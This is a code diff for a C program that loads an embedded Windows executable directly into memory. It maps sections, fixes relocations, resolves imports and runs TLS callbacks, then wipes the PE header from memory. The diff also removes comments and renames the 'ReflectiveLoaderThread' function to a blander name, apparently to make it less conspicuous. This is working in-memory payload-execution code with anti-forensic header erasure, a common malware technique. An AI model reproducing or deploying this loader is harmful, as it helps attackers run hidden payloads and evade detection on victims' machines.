@@ -73,7 +73,6 @@ BOOL ResolveImports(LPVOID base, PIMAGE_NT_HEADERS ntHeaders, tLoadLibraryA pLoa
             FARPROC func = NULL;
 
             if (thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
-                // Import by ordinal
                 func = pGetProcAddress(dllHandle, (LPCSTR)(thunkILT->u1.Ordinal & 0xFFFF));
             }
             else {
@@ -93,9 +92,9 @@ BOOL ResolveImports(LPVOID base, PIMAGE_NT_HEADERS ntHeaders, tLoadLibraryA pLoa
     return TRUE;
 }
 
-DWORD WINAPI ReflectiveLoaderThread(LPVOID param) {
+DWORD WINAPI PeLoaderThread(LPVOID param) {
     MY_DATA* data = (MY_DATA*)param;
-    BYTE* exeBuffer = payload; // embedded exe bytes
+    BYTE* exeBuffer = payload; 
     SIZE_T exeSize = payload_len;
 
     printf("[+] Validating DOS header\n");
@@ -134,18 +133,15 @@ DWORD WINAPI ReflectiveLoaderThread(LPVOID param) {
 
     printf("[+] Memory allocated at: %p\n", imageBase);
 
-    // Copy headers
     printf("[+] Copying headers\n");
     memcpy(imageBase, exeBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
 
-    // Copy sections
     printf("[+] Mapping sections:\n");
     if (!MapSections(imageBase, exeBuffer, ntHeaders)) {
         printf("[!] Failed to map sections\n");
         return 1;
     }
 
-    // Perform base relocations
     ULONGLONG delta = (ULONGLONG)imageBase - ntHeaders->OptionalHeader.ImageBase;
     if (delta != 0) {
         printf("[+] Performing base relocations\n");
@@ -159,7 +155,6 @@ DWORD WINAPI ReflectiveLoaderThread(LPVOID param) {
         printf("[+] No base relocations needed\n");
     }
 
-    // Resolve imports
     printf("[+] Resolving imports\n");
     if (!ResolveImports(imageBase, ntHeaders, data->pLoadLibraryA, data->pGetProcAddress)) {
         printf("[!] Import resolution failed\n");
@@ -185,7 +180,6 @@ DWORD WINAPI ReflectiveLoaderThread(LPVOID param) {
         printf("[+] No TLS callbacks found\n");
     }
 
-    // Erase PE headers if desired (optional)
     printf("[+] Erasing PE header\n");
     memset(imageBase, 0, ntHeaders->OptionalHeader.SizeOfHeaders);
 
@@ -219,7 +213,7 @@ int main() {
     data.pGetProcAddress = GetProcAddress;
     data.baseAddress = NULL;
 
-    HANDLE hThread = CreateThread(NULL, 0, ReflectiveLoaderThread, &data, 0, NULL);
+    HANDLE hThread = CreateThread(NULL, 0, PeLoaderThread, &data, 0, NULL);
     if (!hThread) {
         printf("[!] Failed to create loader thread\n");
         return 1;
